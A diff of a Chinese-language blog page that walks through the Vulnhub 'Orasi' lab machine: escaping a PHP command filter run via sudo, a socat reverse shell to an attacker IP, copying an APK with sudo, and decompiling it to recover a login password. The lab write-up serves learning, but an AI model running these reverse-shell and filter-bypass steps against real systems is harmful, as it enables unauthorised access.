@@ -417,14 +417,14 @@ nmap -p- -sV -A 192.168.113.132
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        2k
+                        2.9k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        10 分
+                        15 分
                     </div>
                     
                 
@@ -651,6 +651,142 @@ drwxr-xr-x  3 irida irida 4096 Feb 11  2021 irida
 drwxr-xr-x  3 kori  kori  4096 Feb 11  2021 kori
 
 </code></pre><p>输入 sudo -l，发现当前用户是挂靠在<strong>kori</strong>上的，对一些参数进行了过滤</p>
+<pre><code>sudo -l
+Matching Defaults entries for www-data on orasi:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on orasi:
+    (kori) NOPASSWD: /bin/php /home/kori/jail.php 
+</code></pre><p>代码审计jail.php，对bash eval nc等命令进行了过滤，其他都可以使用kori权限</p>
+<pre><code>&lt;?php                                                                                                                                              
+array_shift($_SERVER[&#39;argv&#39;]);                                                                                                                     
+$var = implode(&quot; &quot;, $_SERVER[&#39;argv&#39;]);                                                                                                             
+
+if($var == null) die(&quot;Orasis Jail, argument missing\n&quot;);                                                                                           
+
+function filter($var) &#123;                                                                                                                            
+        if(preg_match(&#39;/(`|bash|eval|nc|whoami|open|pass|require|include|file|system|\/)/i&#39;, $var)) &#123;                                              
+                return false;
+        &#125;
+        return true;
+&#125;
+if(filter($var)) &#123;
+        $result = exec($var);
+        echo &quot;$result\n&quot;;
+        echo &quot;Command executed&quot;;
+&#125; else &#123;
+        echo &quot;Restricted characters has been used&quot;;
+&#125;
+echo &quot;\n&quot;;
+?&gt;
+</code></pre><p>所以得使用其他命令来反弹shell，先是尝试sh和exec都不成功</p>
+<p><img src="http://alexjakin.github.io/medias/reward/vulnhub/orasi/2.png" alt="反弹失败"></p>
+<p>还有查阅凌角社区的反弹shell，还有socat命令可用</p>
+<blockquote>
+<p>sudo -u kori /bin/php /home/kori/jail.php  socat tcp-connect:192.168.113.129:8899 exec:”sh”,pty,stderr,setsid,sigint,sane</p>
+</blockquote>
+<p><img src="http://alexjakin.github.io/medias/reward/vulnhub/orasi/3.png" alt="反弹成功"></p>
+<h3 id="提权irida"><a href="#提权irida" class="headerlink" title="提权irida"></a>提权irida</h3><p>输入</p>
+<pre><code>sudo -l
+Matching Defaults entries for kori on orasi:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User kori may run the following commands on orasi:
+    (irida) NOPASSWD: /usr/bin/cp /home/irida/irida.apk /home/kori/irida.apk
+
+</code></pre><p>irida用户目录下文件</p>
+<pre><code>$ ls -la /home/irida
+ls -la /home/irida
+total 4024
+drwxr-xr-x 3 irida irida    4096 Feb 11  2021 .
+drwxr-xr-x 4 root  root     4096 Feb 11  2021 ..
+-rw------- 1 irida irida     465 Feb 11  2021 .bash_history
+-rw-r--r-- 1 irida irida     220 Feb 11  2021 .bash_logout
+-rw-r--r-- 1 irida irida    3526 Feb 11  2021 .bashrc
+drwx------ 3 irida irida    4096 Feb 11  2021 .gnupg
+-rwx------ 1 irida irida 4083889 Feb 11  2021 irida.apk
+-rw-r--r-- 1 irida irida     807 Feb 11  2021 .profile
+-rw------- 1 irida irida      33 Feb 11  2021 user.txt
+</code></pre><p>发现irida.apk没有权限</p>
+<blockquote>
+<p>sudo -u irida /usr/bin/cp /home/irida/irida.apk /home/kori/irida.apk </p>
+</blockquote>
+<pre><code>sudo -u irida /usr/bin/cp /home/irida/irida.apk /home/kori/irida.apk
+/usr/bin/cp: cannot create regular file &#39;/home/kori/irida.apk&#39;: Permission denied
+</code></pre><p>将其下载到kori目录下</p>
+<pre><code>kori@orasi:~$ sudo -u irida /usr/bin/cp /home/irida/irida.apk /home/kori/irida.apk
+&lt;r/bin/cp /home/irida/irida.apk /home/kori/irida.apk
+kori@orasi:~$ ls -la
+ls -la
+total 4012
+drwxr-xrwx 3 kori  kori     4096 May 29 07:32 .
+drwxr-xr-x 4 root  root     4096 Feb 11  2021 ..
+-rw------- 1 kori  kori        6 Feb 11  2021 .bash_history
+drwx------ 3 kori  kori     4096 Feb 11  2021 .gnupg
+-rwx------ 1 irida irida 4083889 May 29 07:32 irida.apk
+-rwxr-xr-x 1 kori  kori      509 Feb 11  2021 jail.php
+
+</code></pre><p>靶机有python环境，开启http服务，将apk下载到本地进行分析</p>
+<pre><code>
+──(root㉿kali)-[/home/kali/Desktop]
+└─# wget http://192.168.113.132:8000/irida.apk
+--2023-05-29 08:01:09--  http://192.168.113.132:8000/irida.apk
+Connecting to 192.168.113.132:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 4083889 (3.9M) [application/vnd.android.package-archive]
+Saving to: ‘irida.apk’
+
+irida.apk                     100%[=================================================&gt;]   3.89M  --.-KB/s    in 0.1s    
+
+
+</code></pre><p>使用jadx反编译irida.apk</p>
+<p><img src="http://alexjakin.github.io/medias/reward/vulnhub/orasi/4.png" alt="反编译"></p>
+<p>查看loginDataSource源码，通过代码审计可以了解到，登录密码会调用<strong>protector函数</strong>比对，<strong>protector函数</strong>是一个生成密码函数，对传入的password（1#2#3#4#5）在字符#处做切割，再从<strong>lexiko</strong>取出对应下标字符做拼接，得到密码：<strong>eye.of.the.tiger.()</strong></p>
+<p>再根据作者提示有一个无用的点，每次去掉一个点尝试后得到密码是<strong>eye.of.the.tiger()</strong></p>
+<pre class=" language-java"><code class="language-java">
+<span class="token keyword">package</span> com<span class="token punctuation">.</span>alienum<span class="token punctuation">.</span>irida<span class="token punctuation">.</span>data<span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> com<span class="token punctuation">.</span>alienum<span class="token punctuation">.</span>irida<span class="token punctuation">.</span>data<span class="token punctuation">.</span>Result<span class="token punctuation">;</span>
+<span class="token keyword">import</span> com<span class="token punctuation">.</span>alienum<span class="token punctuation">.</span>irida<span class="token punctuation">.</span>data<span class="token punctuation">.</span>model<span class="token punctuation">.</span>LoggedInUser<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>UUID<span class="token punctuation">;</span>
+
+<span class="token comment" spellcheck="true">/* loaded from: classes.dex */</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LoginDataSource</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> Result<span class="token operator">&lt;</span>LoggedInUser<span class="token operator">></span> <span class="token function">login</span><span class="token punctuation">(</span>String username<span class="token punctuation">,</span> String password<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>username<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"irida"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> password<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token function">protector</span><span class="token punctuation">(</span><span class="token string">"1#2#3#4#5"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+            <span class="token keyword">try</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+                LoggedInUser user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LoggedInUser</span><span class="token punctuation">(</span>UUID<span class="token punctuation">.</span><span class="token function">randomUUID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Irida Orasis"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Result<span class="token punctuation">.</span>Success</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+                <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Result<span class="token punctuation">.</span>Error</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">IOException</span><span class="token punctuation">(</span><span class="token string">"Error logging in"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Result<span class="token punctuation">.</span>Error</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">IOException</span><span class="token punctuation">(</span><span class="token string">"Error logging in"</span><span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> String <span class="token function">protector</span><span class="token punctuation">(</span>String password<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+        String<span class="token punctuation">[</span><span class="token punctuation">]</span> i <span class="token operator">=</span> password<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> lexiko <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        lexiko<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"eye"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        lexiko<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"tiger"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        lexiko<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        lexiko<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"of"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        lexiko<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"the"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        String buildPassword <span class="token operator">=</span> lexiko<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> lexiko<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> lexiko<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> lexiko<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> lexiko<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>buildPassword<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> buildPassword<span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+
+</code></pre>
+<p><img src="http://alexjakin.github.io/medias/reward/vulnhub/orasi/5.png" alt="登陆成功"></p>
 
             </div>
             <hr/>
@@ -1096,7 +1232,7 @@ Vulnhub是仿真渗透环境，攻击者通过一系列完整的渗透思路，�
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">69.4k</span>
+                <span class="white-color">70.4k</span>
             
 
             
